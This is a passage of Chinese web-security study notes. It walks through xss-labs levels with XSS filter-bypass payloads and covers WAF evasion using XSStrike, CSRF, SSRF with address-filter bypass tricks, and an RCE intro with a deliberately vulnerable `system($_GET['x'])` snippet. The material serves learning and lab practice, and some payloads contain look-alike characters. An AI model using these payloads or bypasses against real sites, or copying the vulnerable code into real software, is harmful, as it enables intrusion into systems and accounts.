+<figure data-type="image" tabindex="31"><img src="https://jinqipiaopiao.github.io//post-images/1634269549791.png" alt="" loading="lazy"></figure>
+<p>作用：仅仅是防止通过js脚本读取到cookie信息，虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站，阻止的是获取cookie</p>
+<p>对方开启HTTP only你在盗取cookie失败的情况下可以采用其他方案<br>
+登录后台权限方式<br>
+1.以cookie形式<br>
+2.直接账号密码登录：<br>
+保存账号密码读取：通过读取他保存在本地的数据（需要xss产生于登录地址，利用表单劫持）</p>
+<figure data-type="image" tabindex="32"><img src="https://jinqipiaopiao.github.io//post-images/1634269553582.png" alt="" loading="lazy"></figure>
+<p>type，id，name通过查看网站源代码中的登录框表单</p>
+<figure data-type="image" tabindex="33"><img src="https://jinqipiaopiao.github.io//post-images/1634269557915.png" alt="" loading="lazy"></figure>
+<p>没保存账号密码读取：通过表单（登录框）劫持数据（产生在后台的xss，例如存储型xss留言等）</p>
+<figure data-type="image" tabindex="34"><img src="https://jinqipiaopiao.github.io//post-images/1634269561370.png" alt="" loading="lazy"></figure>
+<p>劫持原理：抓取数据包另外发送一份跨站平台</p>
+<figure data-type="image" tabindex="35"><img src="https://jinqipiaopiao.github.io//post-images/1634269566442.png" alt="" loading="lazy"></figure>
+<p>但是如果是https网站的话，数据是进行了ssl加密，获取了数据后也是很难读取到密码账号的，鸡肋方法</p>
+<p>手工判断xss跨站漏洞<br>
+靶场：xss_labs<br>
+常用代码<br>
+<strong>echo</strong></p>
+<pre><code>echo
+&lt;?php echo&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
+?&gt;
+</code></pre>
+<p><strong>img标签</strong></p>
+<pre><code>&lt;img src=javascript:alert(&quot;xss&quot;)&gt;
+&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;
+&lt;img src=&quot;URL&quot; style='Xss:expression(alert(xss));'&gt;
+&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
+&lt;img src=&quot;x&quot; onerror=eval(&quot;alert('xss')&quot;)&gt;
+&lt;img src=x onmouseover=alert('xss')&gt;
+</code></pre>
+<p><strong>css</strong></p>
+<pre><code>&lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&gt;
+</code></pre>
+<p><strong>href</strong></p>
+<pre><code>标准格式
+&lt;a href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;
+xss利用格式1
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;
+&lt;a href=javascript:eval(alert(1))&gt;aa&lt;/a&gt;
+&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss)&quot;&gt;aa&lt;/a&gt;
+利用格式2
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;a href=&quot;&quot; onclick=alert(2)&gt;aa&lt;/a&gt;
+利用格式3
+&lt;a href=&quot;&quot; onclick=eval(alert(1))&gt;aa&lt;/a&gt;
+利用格式4
+&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt;
+</code></pre>
+<p><strong>form标签</strong></p>
+<pre><code>xss利用方式1
+&lt;form action=javascript:alert('xss') method=&quot;get&quot;&gt;
+&lt;form action=javascript:alert('xss')&gt;
+xss利用方式2
+&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;
+&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;
+&lt;form action=1 onmouseover=alert('xss')&gt;
+</code></pre>
+<p><strong>input标签</strong></p>
+<pre><code>标准格式
+&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
+1.&lt;input value=&quot;&quot; onclick=alert(1) type=&quot;text&quot;&gt;
+2.&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&gt;
+3.&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;
+</code></pre>
+<p><strong>iframe</strong></p>
+<pre><code>XSS利用方式1
+&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;
+XSS利用方式2
+&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+&lt;!--原code--&gt;
+&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;&quot;&gt;
+&lt;!--base64编码--&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+XSS利用方式3
+&lt;iframe src=&quot;aaa&quot; οnmοuseοver=alert('xss') /&gt;&lt;iframe&gt;
+XSS利用方式3
+&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<p><strong>svg标签</strong></p>
+<pre><code>&lt;svg onload=alert(1)&gt;
+</code></pre>
+<p><strong>level 1</strong><br>
+直接在name赋值个弹窗即可<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634295771067.png" alt="" loading="lazy"><br>
+<strong>level 2(&quot;&gt;闭合标签绕过)</strong><br>
+尝试赋值</p>
+<pre><code>&lt;script&gt;alert()&lt;/script&gt;
+</code></pre>
+<p>发现失败，查看源代码<br>
+发现存在一个htmlspecialchars转化函数<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634295775611.png" alt="" loading="lazy"><br>
+分析发现这个函数是将字符串实体化了<br>
+htmlspecialchars() 函数把预定义的字符转换为 HTML 实体， 把符号转换为实体化标签，xss经常过滤的情况。<br>
+预定义的字符是：</p>
+<pre><code>&amp; （和号）成为 &amp;
+&quot; （双引号）成为 &quot;
+’ （单引号）成为 ’
+&lt; （小于）成为 &lt;
+&gt; （大于）成为 &gt;
+</code></pre>
+<p>实例：</p>
+<pre><code>&lt;?php
+$str=&quot;this is a &lt;b&gt;test&lt;/b&gt;&quot;;
+echo $str;
+echo &quot;&lt;br&gt;&quot;;
+echo htmlspecialchars($str);
+?&gt;
+</code></pre>
+<p>结果：</p>
+<figure data-type="image" tabindex="36"><img src="https://jinqipiaopiao.github.io//post-images/1634295781091.png" alt="" loading="lazy"></figure>
+<p>所以我们不能使用带&lt;&gt;的进行payload，都是回显的地方由两处，第二个地方是没有函数转义的</p>
+<figure data-type="image" tabindex="37"><img src="https://jinqipiaopiao.github.io//post-images/1634295784755.png" alt="" loading="lazy"></figure>
+<p>所以我们可以闭合前面的input语句，然后加入alert</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://jinqipiaopiao.github.io//post-images/1634295789577.png" alt="" loading="lazy"></figure>
+<p>如何判断是双引号闭合还是单引号闭合<br>
+拿level2为例子<br>
+输入'<br>
+审查元素</p>
+<figure data-type="image" tabindex="39"><img src="https://jinqipiaopiao.github.io//post-images/1634295809698.png" alt="" loading="lazy"></figure>
+<p>输入&quot;<br>
+审查元素</p>
+<figure data-type="image" tabindex="40"><img src="https://jinqipiaopiao.github.io//post-images/1634295813626.png" alt="" loading="lazy"></figure>
+<p>输入1<br>
+审查元素</p>
+<figure data-type="image" tabindex="41"><img src="https://jinqipiaopiao.github.io//post-images/1634295819019.png" alt="" loading="lazy"></figure>
+<p>三者对比，可知是双引号闭合</p>
+<p><strong>level 3（事件绕过+'符号闭合）</strong><br>
+测试上述两种代码发现都不行，查看源代码发现两处的字符串都被htmlspecialchars函数转义了，所以我们不能使用&lt;&gt;来payload，那么我们可以利用鼠标点击事件进行payload</p>
+<figure data-type="image" tabindex="42"><img src="https://jinqipiaopiao.github.io//post-images/1634295825327.png" alt="" loading="lazy"></figure>
+<p>payload语句</p>
+<pre><code>'οnclick='alert(1)
+</code></pre>
+<p>前面的单引号与value的左边的单引号闭合，后面的双引号与value的右边的单引号闭合<br>
+提交后如何点击输入框成功</p>
+<figure data-type="image" tabindex="43"><img src="https://jinqipiaopiao.github.io//post-images/1634295829597.png" alt="" loading="lazy"></figure>
+<p><strong>level 4（事件绕过+&quot;符号闭合）</strong><br>
+测试第3关的代码发现不行，f12查看元素发现</p>
+<figure data-type="image" tabindex="44"><img src="https://jinqipiaopiao.github.io//post-images/1634295834453.png" alt="" loading="lazy"></figure>
+<p>value因为是双引号没有闭合掉，所以我们将单引号改为双引号即可通过</p>
+<pre><code>&quot;οnclick=&quot;alert(1)
+</code></pre>
+<p><strong>level 5（herf绕过+符号闭合）</strong><br>
+尝试使用</p>
+<pre><code>“οnclick=&quot;alert(1)
+</code></pre>
+<p>发现on进行替换变成o_n,那么我们就不能使用鼠标事件了</p>
+<figure data-type="image" tabindex="45"><img src="https://jinqipiaopiao.github.io//post-images/1634295839867.png" alt="" loading="lazy"></figure>
+<p>查看元素，发现这个函数可能是在input里面执行的，那么我们可以将<code>&lt;input</code>闭合掉</p>
+<figure data-type="image" tabindex="46"><img src="https://jinqipiaopiao.github.io//post-images/1634295845152.png" alt="" loading="lazy"></figure>
+<p>使用如下代码发现script也被替换了</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="47"><img src="https://jinqipiaopiao.github.io//post-images/1634295853094.png" alt="" loading="lazy"></figure>
+<p>那么我们可以借助a herf属性，自己创建一个javascript代码</p>
+<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;
+</code></pre>
+<p>然后点击输入框附近的链接即可成功。</p>
+<p><strong>level 6（大小写绕过）</strong><br>
+使用前5次的payload，发现都不行，on，src，herf都被替换了</p>
+<figure data-type="image" tabindex="48"><img src="https://jinqipiaopiao.github.io//post-images/1634295869788.png" alt="" loading="lazy"></figure>
+<p>关键字都被过滤，使用大写替绕过</p>
+<pre><code>&quot;&gt;&lt;a hRef=&quot;javaScript:alert(1)&quot;&gt;
+</code></pre>
+<p><strong>level 7（双写绕过）</strong><br>
+发现大写也无法绕过了，查看源代码发现有小写函数</p>
+<figure data-type="image" tabindex="49"><img src="https://jinqipiaopiao.github.io//post-images/1634295876803.png" alt="" loading="lazy"></figure>
+<p>都是发现不是替换成o_n而是将on直接变成空字符，那么我们可以双写进行绕过</p>
+<pre><code>&quot;&gt;&lt;a hhrefref=&quot;javasscriptcript:alert(1)&quot;&gt;
+</code></pre>
+<p><strong>level 8（编码绕过）</strong><br>
+大小写，双写均不行，替换为unicode编码</p>
+<figure data-type="image" tabindex="50"><img src="https://jinqipiaopiao.github.io//post-images/1634295883329.png" alt="" loading="lazy"></figure>
+<p><strong>level 9（特殊绕过）</strong><br>
+查看代码，发现代码会检测是否存在http://</p>
+<figure data-type="image" tabindex="51"><img src="https://jinqipiaopiao.github.io//post-images/1634295889476.png" alt="" loading="lazy"></figure>
+<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/*http://*/
+</code></pre>
+<p><strong>less 10（type绕过）</strong><br>
+f12查看元素发现</p>
+<figure data-type="image" tabindex="52"><img src="https://jinqipiaopiao.github.io//post-images/1634295894746.png" alt="" loading="lazy"></figure>
+<p>但是type是hidden，被隐藏了，所以我们必须都试一次</p>
+<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
+</code></pre>
+<p><strong>level 11（referer头绕过）</strong></p>
+<figure data-type="image" tabindex="53"><img src="https://jinqipiaopiao.github.io//post-images/1634295900283.png" alt="" loading="lazy"></figure>
+<p>http referer 头，检测来源。<br>
+浏览器会检测此JS代码是否来自CSRF跨站请求脚本。检测来源，</p>
+<figure data-type="image" tabindex="54"><img src="https://jinqipiaopiao.github.io//post-images/1634295905032.png" alt="" loading="lazy"></figure>
+<p>如果管理员在登录状态的情况下，进入攻击方的带有登录时触发了添加管理员账号和密码的漏洞的网站，那么就会导致后台添加了新的账号和密码<br>
+如何防范：检测来源，也就是浏览器的同源策略，看看是否来自同一个域名，不是同一个域名的不接受。<br>
+token验证会解决这个问题<br>
+此关卡在referer头输入即可</p>
+<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
+</code></pre>
+<figure data-type="image" tabindex="55"><img src="https://jinqipiaopiao.github.io//post-images/1634295912396.png" alt="" loading="lazy"></figure>
+<p><strong>level 12（agent绕过）</strong></p>
+<figure data-type="image" tabindex="56"><img src="https://jinqipiaopiao.github.io//post-images/1634295918012.png" alt="" loading="lazy"></figure>
+<p>payload:</p>
+<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
+</code></pre>
+<figure data-type="image" tabindex="57"><img src="https://jinqipiaopiao.github.io//post-images/1634295926147.png" alt="" loading="lazy"></figure>
+<p><strong>level 13（cookie绕过）</strong><br>
+抓包发现有cookie<br>
+尝试在cookie后面加入</p>
+<pre><code>t_sort=&quot;&gt;&lt;οnclick=&quot;alert(1)&quot; type='text'&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634295932725.png" alt="" loading="lazy"><br>
+成功</p>
+<p><strong>level 14</strong><br>
+<strong>level 15（文件包含）</strong><br>
+审查元素</p>
+<figure data-type="image" tabindex="58"><img src="https://jinqipiaopiao.github.io//post-images/1634295940027.png" alt="" loading="lazy"></figure>
+<p>可以看到我们提交的参数src的值被插入到了标签的class属性值中，但是前面还有ng-include这样的字符。<br>
+ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。<br>
+先尝试看看能不能直接闭合标签来触发弹窗</p>
+<figure data-type="image" tabindex="59"><img src="https://jinqipiaopiao.github.io//post-images/1634295945599.png" alt="" loading="lazy"></figure>
+<p>看出被实体化了<br>
+先看看源文件的代码</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634295952392.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634295962066.png" alt="" loading="lazy"></p>
+<p>既然此处用了ng-include指令的话，先了解一下其具体的用法。</p>
+<pre><code>1、ng-include 指令用于包含外部的 HTML文件。
+2、包含的内容将作为指定元素的子节点。
+3、ng-include 属性的值可以是一个表达式，返回一个文件名。
+4、默认情况下，包含的文件需要包含在同一个域名下。
+特别值得注意的几点如下：
+1.ng-include,如果单纯指定地址，必须要加引号
+2.ng-include,加载外部html，script标签中的内容不执行
+3.ng-include,加载外部html中含有style标签样式可以识别
+</code></pre>
+<p>既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件<br>
+构造代码：</p>
+<pre><code>?src='level1.php?name=&lt;img src=1 οnerrοr=alert()&gt;'
+</code></pre>
+<p><strong>level 16（%0a绕过）</strong><br>
+查看代码发现script，/都进行过滤</p>
+<figure data-type="image" tabindex="60"><img src="https://jinqipiaopiao.github.io//post-images/1634295969874.png" alt="" loading="lazy"></figure>
+<p>采用换行符%0a进行绕过,触发xss。</p>
+<pre><code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;
+</code></pre>
+<p><strong>level 17（闭合标签绕过）</strong></p>
+<figure data-type="image" tabindex="61"><img src="https://jinqipiaopiao.github.io//post-images/1634295975129.png" alt="" loading="lazy"></figure>
+<p>闭合<code>&lt;embed&gt;</code>即可</p>
+<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; onmouseover=alert()
+</code></pre>
+<p><strong>level 18（闭合标签绕过）</strong><br>
+<strong>跟less 19一致，只是多了一个注入点通过闭合<embed>即可</strong></p>
+<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; οnmοuseοver=alert()
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45441315/article/details/119718207</p>
+<h1 id="web漏洞-xss跨站之waf绕过及安全修复">WEB漏洞-XSS跨站之WAF绕过及安全修复</h1>
+<p>waf防护演示<br>
+靶场：xss-labs</p>
+<figure data-type="image" tabindex="62"><img src="https://jinqipiaopiao.github.io//post-images/1634297807412.png" alt="" loading="lazy"></figure>
+<p>被安全狗拦截</p>
+<figure data-type="image" tabindex="63"><img src="https://jinqipiaopiao.github.io//post-images/1634297811186.png" alt="" loading="lazy"></figure>
+<p>分析拦截情况<br>
+分析方法：<br>
+1、通过去除关键词或关键词的其中些字母判断拦截了什么关键词，如下正常</p>
+<figure data-type="image" tabindex="64"><img src="https://jinqipiaopiao.github.io//post-images/1634297815210.png" alt="" loading="lazy"></figure>
+<p>2、分析了拦截情况可知也可能是尖括号里面如果有s、o之类的关键词其中的某个或多个字母的话就会拦截，正则表达式</p>
+<figure data-type="image" tabindex="65"><img src="https://jinqipiaopiao.github.io//post-images/1634297819429.png" alt="" loading="lazy"></figure>
+<p>3、不拦截，但是不管用</p>
+<figure data-type="image" tabindex="66"><img src="https://jinqipiaopiao.github.io//post-images/1634297823834.png" alt="" loading="lazy"></figure>
+<p>4、正常，并且可以访问</p>
+<figure data-type="image" tabindex="67"><img src="https://jinqipiaopiao.github.io//post-images/1634297829100.png" alt="" loading="lazy"></figure>
+<p>/结束</p>
+<figure data-type="image" tabindex="68"><img src="https://jinqipiaopiao.github.io//post-images/1634297834287.png" alt="" loading="lazy"></figure>
+<p>常规WAF绕过思路</p>
+<pre><code>标签语法替换
+特殊符号干扰
+/ #
+提交方式更改
+垃圾数据溢出
+加密解密算法
+结合其他漏洞绕过
+</code></pre>
+<p>XSStrike自动化工具说明<br>
+靶场：xss-labs，dvws</p>
+<p>各个选项说明</p>
+<pre><code>-h, --help 显示帮助信息并退出
+-u, --url 目标url
+–data post方法的数据
+-f, --file 从文件读取payloads
+-t, --threads 线程数量
+-l, --level 爬取级别
+-t, --encode payload采取的编码
+–json json格式的数据
+–path 指定路径注入
+–seeds 从文件加载url
+–fuzzer fuzz工具
+–update 更新
+–timeout 超时时间
+–params 寻找参数
+–crawl 爬取
+–proxy 使用代理
+–blind 爬取时盲注
+–skip 跳过确认等
+–skip-dom 跳过dom检查
+–headers 添加headers
+-d, --delay 两次请求之间的延迟
+
+-u或--url
+添加目标url，单个GET方法
+</code></pre>
+<figure data-type="image" tabindex="69"><img src="https://jinqipiaopiao.github.io//post-images/1634297841642.png" alt="" loading="lazy"></figure>
+<pre><code>?name=&lt;A/+/onmOuSeoVer%0d=%0dconfirm()%0dx&gt;v3dm0s
+</code></pre>
+<p>挑选其中一个手动注入发现成功绕过</p>
+<figure data-type="image" tabindex="70"><img src="https://jinqipiaopiao.github.io//post-images/1634297850192.png" alt="" loading="lazy"></figure>
+<p><strong>--data</strong><br>
+post方法的数据（多个参数）<br>
+python xsstrike.py -u &quot;http://IP地址/vulnerabilities/xss_s/&quot; --data &quot;txtName=test&amp;mtxMessage=This+is+a+test+comment.&amp;btnSign=Sign+Guestbook&quot;</p>
+<figure data-type="image" tabindex="71"><img src="https://jinqipiaopiao.github.io//post-images/1634297855814.png" alt="" loading="lazy"></figure>
+<p><strong>--seeds</strong><br>
+从文件<br>
+选项:–seeds 不使用-u选项<br>
+python xsstrike.py --seeds urls.txt</p>
+<figure data-type="image" tabindex="72"><img src="https://jinqipiaopiao.github.io//post-images/1634297869277.png" alt="" loading="lazy"></figure>
+<p><strong>--path</strong></p>
+<p>测试url路径组件</p>
+<pre><code>想要在URL路径中注入这样的有效负载 http://example.com/search/&lt;payload&gt;
+python xsstrike.py -u &quot;http://example.com/search/form/query&quot; --path
+</code></pre>
+<p><strong>--json</strong><br>
+POST数据为json格式</p>
+<pre><code>python xsstrike.py -u &quot;http://example.com/search.php&quot; --data '{&quot;q&quot;:&quot;query&quot;}' --json
+</code></pre>
+<p><strong>--crawl</strong><br>
+爬取</p>
+<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --crawl
+</code></pre>
+<figure data-type="image" tabindex="73"><img src="https://jinqipiaopiao.github.io//post-images/1634297875762.png" alt="" loading="lazy"></figure>
+<p><strong>--level</strong><br>
+爬取深度<br>
+选项-l或–level 默认为2</p>
+<pre><code>python xsstrike.py -u &quot;http://IP地址/vulnerabilities/&quot; --crawl -l 5
+</code></pre>
+<figure data-type="image" tabindex="74"><img src="https://jinqipiaopiao.github.io//post-images/1634297880885.png" alt="" loading="lazy"></figure>
+<p><strong>-f或--file</strong><br>
+从文件读取payloads</p>
+<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r?name=''&quot; -f payloads.txt
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634297885502.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634297893131.png" alt="" loading="lazy"></p>
+<p><strong>--params</strong><br>
+查找隐藏参数</p>
+<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --params
+</code></pre>
+<figure data-type="image" tabindex="75"><img src="https://jinqipiaopiao.github.io//post-images/1634297897389.png" alt="" loading="lazy"></figure>
+<p><strong>--fazzer</strong></p>
+<figure data-type="image" tabindex="76"><img src="https://jinqipiaopiao.github.io//post-images/1634297901148.png" alt="" loading="lazy"></figure>
+<p><strong>Fuzz下XSS绕过WAF</strong><br>
+靶场：xss-labs<br>
+使用：fuzz模糊搜索</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634297906542.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634297911823.png" alt="" loading="lazy"></p>
+<p>安全修复方案<br>
+开启httponly<br>
+https://www.yisu.com/zixun/310495.html</p>
+<p>输入过滤<br>
+对输入进行过滤，不允许可能导致XSS攻击的字符输入</p>
+<p>输出转义<br>
+根据输出点的位置对输出到前端的内容进行适当转义</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45441315/article/details/119747063</p>
+<h1 id="csrf及ssrf漏洞案例讲解">CSRF及SSRF漏洞案例讲解</h1>
+<figure data-type="image" tabindex="77"><img src="https://jinqipiaopiao.github.io//post-images/1634298208868.png" alt="" loading="lazy"></figure>
+<p>CSRF漏洞解释，原理<br>
+CSRF(Cross-site request forgery)<br>
+跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634298213135.png" alt="" loading="lazy"><br>
+<strong>原理详解</strong></p>
+<p>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作<br>
+XSS 利用站点内内的信任用户，盗取cookie<br>
+CSRF通过伪装成受信任用户请求受信任的网站<br>
+利用目标用户的合法身份，以目标的名义执行某些非法参数<br>
+利用条件：已经登录系统，用户访问URL	已存在的网站中让用户跳转<br>
+CSRF漏洞检测，案例，防御</p>
+<p><strong>防御方案</strong><br>
+1.当用户发送重要的请求时输入验证码<br>
+2.涉及随机TOKEN ---数据包的唯一值<br>
+3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>
+4.设置验证码<br>
+5.限制请求方式只能为post0<br>
+<strong>SSRF（服务器端请求伪造）</strong></p>
+<pre><code>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为 
+    它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
+SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 
+注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。
+</code></pre>
+<p><strong>0x01 可能出现的地方</strong></p>
+<pre><code>1.社交分享功能：获取超链接的标题等内容进行显示
+2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
+3.在线翻译：给网址翻译对应网页的内容
+4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
+5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
+6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
+7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
+8.数据库内置功能：数据库的比如mongodb的copyDatabase函数
+9.邮件系统：比如接收邮件服务器地址
+10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
+11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞
+一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
+12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）
+</code></pre>
+<p><strong>0x02 漏洞验证</strong></p>
+<pre><code>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求
+比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞
+2.dnslog等工具进行测试，看是否被访问
+--可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。
+3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址
+--从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址
+--通过二级域名暴力猜解工具模糊猜测内网地址
+4.直接返回的Banner、title、content等信息
+5.留意bool型SSRF
+</code></pre>
+<p><strong>0x03 利用方式</strong></p>
+<pre><code>1.让服务端去访问相应的网址
+2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms
+3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
+4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）
+5.攻击内网应用程序（利用跨协议通信技术）
+6.判断内网主机是否存活：方法是访问看是否有端口开放
+7.DoS攻击（请求大文件，始终保持连接keep-alive always）
+</code></pre>
+<p><strong>0x04 绕过小技巧</strong></p>
+<pre><code>注：参考[8]会有更详细的绕过方式总结
+1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的
+2.各种IP地址的进制转换
+3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/
+4.短网址绕过 http://t.cn/RwbLKDx
+5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）
+指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)
+6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80
+7.探测内网域名，或者将自己的域名解析到内网ip
+8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，
+但这样可以用 http://abc@10.153.138.81/ 绕过
+</code></pre>
+<p><strong>0x05 漏洞示例</strong></p>
+<pre><code>1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf
+2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）
+3.weblogic的ssrf
+</code></pre>
+<p><strong>0x06 漏洞修复</strong></p>
+<pre><code>1.禁止跳转
+2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
+3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题
+4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）
+5.限制请求的端口为http常用的端口，比如 80、443、8080、8090
+6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
+</code></pre>
+<p><strong>0x07 漏洞利用中牵涉的小技巧</strong></p>
+<pre><code>crontab -l 显示当前计划任务
+crontab -r 清除当前计划任务
+</code></pre>
+<p><strong>端口转发工具 socat</strong></p>
+<pre><code>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行
+AddType application/x-httpd-php
+</code></pre>
+<h1 id="三十rce代码及命令执行漏洞全解">三十：RCE代码及命令执行漏洞全解</h1>
+<p>摘要：在WEB应用中有时候程序员为了考虑灵活性，简明性，会在代码调用或者命令执行函数去处理。比如当应用在调用一些能将字符串转换为代码的函数时，没有考虑用户是都能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞</p>
+<figure data-type="image" tabindex="78"><img src="https://jinqipiaopiao.github.io//post-images/1634364175163.png" alt="" loading="lazy"></figure>
+<p><strong>函数eval:</strong></p>
+<p>eval() 函数把字符串按照 PHP 代码来计算。<br>
+该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>
+如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
+<p><strong>函数system：</strong><br>
+system — 执行外部程序，并且显示输出</p>
+<pre><code>$code=$_GET['x'];
+echo system($code)         //x=ipconfig   x=ver
+</code></pre>
+<p><strong>漏洞形成条件：</strong></p>
+<p>可控变量，以及漏洞函数  无拓展功能，一般没有此类函数<br>
+<strong>文件包含漏洞：</strong><br>
